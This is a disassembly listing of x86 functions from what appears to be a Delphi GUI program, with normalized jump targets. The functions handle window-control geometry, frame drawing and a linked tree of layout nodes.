mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_44b35c
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_44c1d0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4460d0
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_446094
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_41900c
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c264
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_44c1d0
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_44b824
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_44ba70
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_44b824
call sub_44bfa4
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_44c2ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_404008
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_404654
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_44c334
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44c52c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_44ca04
mov eax [ ebp - 0x8 ]
call sub_44ba00
xor edx edx
push ebp
push sub_44c50f
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c516
mov eax [ ebp - 0x8 ]
call sub_44ba04
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44b1d8
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_44c2ec
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403430
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_44b4f8
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_44c2ec
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_442ad8
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_4438b8
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403234
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_44c53c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_419034
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4249b8
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c594
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_423f90
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_4246ec
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_42468c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_42468c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_423f90
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_42468c
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_42468c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_44c61c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_44c53c
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_44c594
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_44c594
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_44c53c
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_44c594
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_44c594
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_44c6f8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4243c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44c84e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_441794
mov eax [ ebp - 0x4 ]
call sub_4246c4
xor eax eax
push ebp
push sub_44c831
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424a38
xor eax eax
push ebp
push sub_44c814
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_4460d0
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c81b
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_424a38
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_446094
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_442558
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_44c85c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_447ed0
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_442600
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_4425bc
mov ecx eax
xor edx edx
xor eax eax
call sub_419034
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_4493d8
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41905c
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_44c9d0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44c9d0
pop ecx
mov eax ebx
call sub_403234
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44c9d0
pop ecx
sub_44ca04
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_44c9d0
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403234
xor eax eax
mov [ esi + 0x64 ] eax
sub_44ca60
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ba70
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_44ca9c
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44ca9c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44cd09
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405efc
mov edx [ ebp - 0x8 ]
pop eax
call sub_4042d0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
mov eax [ ebx + 0x14 ]
call sub_44b1fc
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405efc
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405efc
mov edx [ ebp - 0x10 ]
pop eax
call sub_4042d0
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403234
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cd10
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40402c
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_44b5ac
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_44b724
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_44b760
mov eax [ ebx + 0x18 ]
call sub_44b5ac
mov [ edx + 0x18 ] eax
push esi
push sub_44d2ac
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_44bad8
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_44b760
mov eax [ esi + 0x64 ]
call sub_44b724
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403234
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_44d284
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403234
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_44b2a8
mov edx eax
mov eax edi
call sub_44b74c
mov eax edi
call sub_44b5ac
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_44d2ac
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_44bad8
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_44d2ac
mov edx [ eax + 0x14 ]
mov eax esi
call sub_44bad8
mov eax [ ebx + 0x14 ]
call sub_403234
mov eax edi
call sub_403234
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_44cd18
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_447ed0
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_40809c
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_44b74c
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_447e3c
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_44b74c
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_44d134
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_44d2ac
xor edx edx
mov eax edi
call sub_44bad8
sub_44cdf4
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44b724
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_4029fc
mov edx eax
mov eax ebx
call sub_44b74c
sub_44ce30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_44ce9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cea2
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_44cea8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44cf57
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44b4b4
mov eax [ ebp - 0x8 ]
call sub_44ce30
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_44cea8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cf5e
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_44cea8
pop ecx
sub_44cf64
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44d09d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44d04c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_447e3c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d053
mov eax [ ebp - 0x10 ]
call sub_403234
retn
inc ebx
